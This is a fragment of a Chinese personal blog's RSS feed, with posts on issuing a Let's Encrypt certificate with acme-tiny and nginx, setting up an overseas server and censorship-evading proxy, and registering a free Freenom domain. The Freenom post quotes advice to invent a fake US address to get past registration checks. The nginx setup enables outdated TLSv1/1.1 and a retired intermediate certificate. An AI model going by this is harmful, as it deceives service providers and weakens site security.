&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;会输出openssl的信息，其中&lt;code&gt;OPENSSLDIR&lt;/code&gt;对应的路径就是&lt;code&gt;openssl.cnf&lt;/code&gt;文件的地址，自行将上面的&lt;code&gt;cat /etc/ssl/openssl.cnf&lt;/code&gt;,改为自己的路径运行。&lt;/p&gt;
&lt;h3 id="配置验证服务"&gt;配置验证服务
&lt;/h3&gt;&lt;p&gt;前面介绍过了Let&amp;rsquo;s Encrypt验证的原理是在你的服务器上生成一个随机文件，在通过创建CSR时的域名进行访问下载，如果成功表明你对这个域名的拥有权。&lt;/p&gt;
&lt;p&gt;创建用于存放网站的目录site以及用于验证文件存放的子目录&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;mkdir -p /site/.well-known/acme-challenge/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后再Nginx中配置:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-nginx" data-lang="nginx"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;server&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;server_name&lt;/span&gt; &lt;span style="color:#e6db74"&gt;www.yoursite.com&lt;/span&gt; &lt;span style="color:#e6db74"&gt;yoursite.com&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;location&lt;/span&gt; &lt;span style="color:#e6db74"&gt;^~&lt;/span&gt; &lt;span style="color:#e6db74"&gt;/.well-known/acme-challenge/&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;alias&lt;/span&gt; &lt;span style="color:#e6db74"&gt;/home/xxx/www/challenges/&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;try_files&lt;/span&gt; $uri =&lt;span style="color:#ae81ff"&gt;404&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;location&lt;/span&gt; &lt;span style="color:#e6db74"&gt;/&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;rewrite&lt;/span&gt; &lt;span style="color:#e6db74"&gt;^/(.*)&lt;/span&gt;$ &lt;span style="color:#e6db74"&gt;https://yoursite.com/&lt;/span&gt;$1 &lt;span style="color:#e6db74"&gt;permanent&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;别忘了改&lt;code&gt;yoursite&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这个配置会优先查找&lt;code&gt;/site&lt;/code&gt;目录下的网站，建议保留以后证书认证还可以用到，因为颁发的证书一次可以使用90天。&lt;/p&gt;
&lt;h3 id="获取网站证书"&gt;获取网站证书
&lt;/h3&gt;&lt;p&gt;先下载&lt;code&gt;acme-tiny&lt;/code&gt;脚本到之前的site_cert目录：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;指定账户私钥、CSR以及网站上验证文件的目录，执行脚本:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ &amp;gt; ./signed.crt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行成功的话会在当前目录生成一个&lt;code&gt;signed.crt&lt;/code&gt;文件，这个文件就是申请好的证书文件。&lt;/p&gt;
&lt;p&gt;我在这里出现了错误提示&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;ValueError: Wrote file to /site/.well-known/acme-challenge/blablabla, but couldn&amp;#39;t download http://www.yoursite.com/.well-known/acme-challenge/blablabla
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;大概的意思就是，在网站目录里写入了一个验证文件，但是Let&amp;rsquo;s Encrypt的服务器访问不到你的网站，建议先去看一看Nginx配置是否出错，再有可能是自己的域名无法在国外解析，建议暂时使用国外的DNS解析商。推荐的有：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class="link" href="https://dns.he.net/" target="_blank" rel="noopener"
&gt;Hurricane Electric Free DNS&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.zoneedit.com/" target="_blank" rel="noopener"
&gt;ZoneEdit&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.cloudflare.com/" target="_blank" rel="noopener"
&gt;CloudFlare&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这些都是免费的，但是因为我自己的域名后缀为.tk，上面第一个DNS解析商警告因为.tk域名滥用，不给解析。&lt;/p&gt;
&lt;p&gt;网站证书到手以后，还要下载 Let&amp;rsquo;s Encrypt 的中间证书。证书链中大部分都是「站点证书 – 中间证书 – 根证书」这样三级。服务端只需要发送前两个证书即可。我们需要把中间证书和网站证书合在一起：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem &amp;gt; intermediate.pem
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cat signed.crt intermediate.pem &amp;gt; chained.pem
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;最终&lt;/strong&gt;，在Nginx中添加证书配置，并reload，我的部分配置如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-nginx" data-lang="nginx"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;server&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;listen&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;443&lt;/span&gt; &lt;span style="color:#e6db74"&gt;ssl&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;ssl_certificate&lt;/span&gt; &lt;span style="color:#e6db74"&gt;/site_cert/chained.pem&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;ssl_certificate_key&lt;/span&gt; &lt;span style="color:#e6db74"&gt;/site_cert/domain.key&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;ssl_protocols&lt;/span&gt; &lt;span style="color:#e6db74"&gt;TLSv1&lt;/span&gt; &lt;span style="color:#e6db74"&gt;TLSv1.1&lt;/span&gt; &lt;span style="color:#e6db74"&gt;TLSv1.2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;ssl_ciphers&lt;/span&gt; &lt;span style="color:#e6db74"&gt;HIGH:!aNULL:!MD5&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;server_name&lt;/span&gt; &lt;span style="color:#e6db74"&gt;braindance.tk&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;index&lt;/span&gt; &lt;span style="color:#e6db74"&gt;index.html&lt;/span&gt; &lt;span style="color:#e6db74"&gt;index.htm&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;root&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;…………………………&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nginx -s reload
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="证书自动更新-计划任务"&gt;证书自动更新 计划任务
&lt;/h3&gt;&lt;p&gt;​ 至此我们已经成功的获取到了Https证书，但是获取到的Https证书只有90天的时效，到期的话还需要使用相同的方法进行更新，为了避免某次忘记更新导致网站出现问题，我们可以使用linux中的crond服务为我们自动更新证书。&lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;vi&lt;/code&gt; 在 &lt;code&gt;/site_cert&lt;/code&gt; 文件夹 创建 计划任务脚本 &lt;code&gt;renew_cert.sh&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;vi /site_cert/renew_cert.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过&lt;code&gt;vi&lt;/code&gt;输入以下内容&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cd /fakesite_cert/
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ &amp;gt; ./signed.crt &lt;span style="color:#f92672"&gt;||&lt;/span&gt; exit
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem &amp;gt; intermediate.pem
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cat signed.crt intermediate.pem &amp;gt; chained.pem
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nginx -s reload
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;更新的大致过程是，运行python脚本再次更新&lt;code&gt;signed.crt&lt;/code&gt;申请证书文件，再进行证书合并写入&lt;code&gt;chained.pem&lt;/code&gt;文件。&lt;/p&gt;
&lt;p&gt;然后给这个文件赋予 可执行 属性&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;chmod +x /fakesite_cert/renew_cert.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;crontab -e&lt;/code&gt;指令打开定时任务配置文件，并加入以下内容。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;0 0 1 * * /home/xxx/shell/renew_cert.sh &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;对于上面指令的具体意思请自行搜索&lt;code&gt;crontab&lt;/code&gt;命令&lt;/p&gt;
&lt;h3 id="完工"&gt;完工
&lt;/h3&gt;</description></item><item><title>搭窝过程(二)</title><link>https://www.braindance.top/posts/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%BA%8C/</link><pubDate>Wed, 02 Sep 2020 22:05:34 +0000</pubDate><guid>https://www.braindance.top/posts/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%BA%8C/</guid><description>&lt;p&gt;​ 服务器到手了肯定不能闲着，既然有了国外的服务器，第一个想法就是去整一个魔法，我姐也因为网络问题，经常让我帮忙下载国外的资料，这次整一个就能让我姐自己用了。&lt;/p&gt;
&lt;p&gt;​ 还是出于会被Qang的顾虑，自己对于这方面的知识也很少，普通的建设方法据说已经会被主动嗅探等给检测到，于是就花了很久找伪装的方法，结果在github上找到了一个&lt;a class="link" href="https://github.com/ShadowsocksR-Live/shadowsocksr-native" target="_blank" rel="noopener"
&gt;项目&lt;/a&gt;，使用的技术大概就是反向代理+Https的协议，这里就不细讲了&lt;del&gt;主要是害怕&lt;/del&gt;，可以自己到项目去看看。&lt;/p&gt;
&lt;p&gt;​ 在这里还学会了搞&lt;a class="link" href="https://letsencrypt.org/" target="_blank" rel="noopener"
&gt;Let&amp;rsquo;s Encrypt&lt;/a&gt;的SSL证书，主要是用来保证数据的加密传输，也就是Https协议，后面开一篇申请证书的过程文章，照着参阅的文章也踩了不少坑。&lt;/p&gt;</description></item><item><title>Freenom域名注册解析到服务器</title><link>https://www.braindance.top/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</link><pubDate>Wed, 02 Sep 2020 12:25:37 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid><description>&lt;h3 id="1官网"&gt;&lt;strong&gt;1.官网&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;&lt;a class="link" href="https://www.freenom.com/zh/index.html?lang=zh" target="_blank" rel="noopener"
&gt;Freenom - 人人都熟悉的名字&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官网右上角可以切换中文，简直了。&lt;/p&gt;
&lt;p&gt;然后觉得我讲的有点啰嗦的还可以看油管上的&lt;a class="link" href="https://www.youtube.com/watch?v=IAZDrtmQeh0" target="_blank" rel="noopener"
&gt;freenom教学视频&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9Xvj.png"
loading="lazy"
alt="BJ9Xvj.png"
&gt;&lt;/p&gt;
&lt;h3 id="2搜索想要的域名"&gt;&lt;strong&gt;2.搜索想要的域名&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJCFGF.png"
loading="lazy"
alt="BJCFGF.png"
&gt;&lt;/p&gt;
&lt;p&gt;​ 搜索以后会列出来可以选择的域名列表，上面的是免费域名，下面的则是一些付费域名。&lt;/p&gt;
&lt;p&gt;​ 我在这里还遇到了一个坑提前说。freenom提供的有自己的域名解析服务，国内也可以访问的到，我遇到了一个问题有回答说换个DNS解析就行，推荐的是&lt;a class="link" href="https://dns.he.net/" target="_blank" rel="noopener"
&gt;Hurricane Electric Hosted &lt;em&gt;DNS&lt;/em&gt;&lt;/a&gt;，但这个网站禁止了.tk域名的解析。类似的问题请自行先考虑&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9xrn.png"
loading="lazy"
alt="BJ9xrn.png"
&gt;接下来选中域名以后点击Get it now！以后只是添加到购物车，随后点击界面中的Checkout跳转到结算界面，这里只用选择期限即可。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9vKs.png"
loading="lazy"
alt="BJ9vKs.png"
&gt;点击continue按钮会提示注册，这里又有坑。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;由于蝗虫一般涌入试图薅羊毛的中国人让 &lt;code&gt;freenom&lt;/code&gt; 极度不爽, &lt;code&gt;freenom&lt;/code&gt; 的免费域名注册对中国人并不友好, 极大概率注册会失败. 为了顺利注册免费域名, 请首先用美国 IP 翻着墙, 使用 Google 账号直接登录该站, 不必自主注册账号, 在填写个人资料时, 用 &lt;a class="link" href="https://www.fakenamegenerator.com/" target="_blank" rel="noopener"
&gt;fakenamegenerator.com&lt;/a&gt; 胡诌个美国住址, 就可以随意注册免费域名了.&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id="3域名解析"&gt;&lt;strong&gt;3.域名解析&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;​ 完成以后点击Services&amp;ndash;&amp;gt;My Domains进入域名管理页面。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJCk24.png"
loading="lazy"
alt="BJCk24.png"
&gt;&lt;/p&gt;
&lt;p&gt;点击域名后面的Manage Domain进入域名解析&lt;/p&gt;
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/penginman/PicBed/master/20201029160037.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJCpV0.png"
loading="lazy"
alt="BJCpV0.png"
&gt;&lt;/p&gt;
&lt;p&gt;​ Nameservers就是域名解析服务器进入后两个选项，第一个是使用freenom的域名解析服务器，第二个是使用其他域名解析商的服务器。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJC9aV.png"
loading="lazy"
alt="BJC9aV.png"
&gt;&lt;/p&gt;
&lt;p&gt;之后点击Manage Freenom DNS进行域名解析就可以使用注册的域名访问了，示例：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJCiPU.png"
loading="lazy"
alt="BJCiPU.png"
&gt;&lt;/p&gt;</description></item><item><title>造窝过程(一)</title><link>https://www.braindance.top/posts/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-%E4%B8%80/</link><pubDate>Wed, 02 Sep 2020 11:14:35 +0000</pubDate><guid>https://www.braindance.top/posts/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-%E4%B8%80/</guid><description>&lt;ul&gt;
&lt;li&gt;备案劝退&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;很早就有想搭博客的想法了，起初在阿里云上用宝塔面板搭建过一个，觉得IP访问太暴露了就想去备案，结果阿里云的备案过程真的是把我给整吐了，大概流程就是：填网站信息&amp;raquo;&amp;gt;阿里云审核通过&amp;raquo;&amp;gt;工信部审核。看似个简单的过程，我在阿里云审核那就被劝退了，官方小改改先是跟我说填写信息不能有什么什么字眼，很耐心的帮我改了改，然后让我提供钉钉号，说一会会有官方加我好友跟我视频认证，这对于稍微有点自闭的我来说有点难顶，但想都到这步了硬着头皮来吧。等了一个多小时，我看到邮箱里有封邮件说我拒绝视频认证，审核失败，我tm直接当场？？？&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9L8g.jpg"
loading="lazy"
alt="BJ9L8g.jpg"
&gt;看了看钉钉申请和审核失败的邮件，之间就相差了2分钟。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;选择服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;听说了备案的依据是服务器的地理位置，想到去买国外的服务器，在知乎、谷歌上搜了一大堆国外的服务商，大致推荐的都是：&lt;a class="link" href="https://www.vultr.com/" target="_blank" rel="noopener"
&gt;vultr&lt;/a&gt;、&lt;a class="link" href="https://bwh88.net/" target="_blank" rel="noopener"
&gt;搬瓦工&lt;/a&gt;、blablablabal，看到价格和配置都特别心动，但是都是很久之前的信息，现在已经变贵了，最后挑了一个现在最便宜的&lt;a class="link" href="https://www.pacificrack.com/" target="_blank" rel="noopener"
&gt;pacificrack&lt;/a&gt;,看评价说便宜的原因就是超售，而且服务商有可能跑路balbabla的，我现在就心想体验一番管他呢，最后买的配置1cpu 1G 20GB 100Mbps一年$12，觉得比阿里云那个学生云香，最重要的是不用备案！！！！&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;域名注册&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;服务器到手以后，又听说什么国外的服务器有可能会被Qang，我也尽量少选国内提供的服务，随后找到了国外免费的域名注册商&lt;a class="link" href="http://www.freenom.com" target="_blank" rel="noopener"
&gt;freenom&lt;/a&gt;，注册了域名braindanc.tk，把域名解析到自己的服务器，后面补一篇注册的过程吧。&lt;/p&gt;
&lt;p&gt;到这服务器和域名都搞定了。&lt;/p&gt;</description></item><item><title>第一篇文章</title><link>https://www.braindance.top/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</link><pubDate>Wed, 26 Aug 2020 16:40:03 +0000</pubDate><guid>https://www.braindance.top/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</guid><description>&lt;p&gt;&lt;strong&gt;第一篇文章的内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;刚把博客搭成，然后看了看markdown的语法，以后慢慢往上面加吧。&lt;/p&gt;</description></item><item><title>archives</title><link>https://www.braindance.top/page/archives/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.braindance.top/page/archives/</guid><description/></item></channel></rss>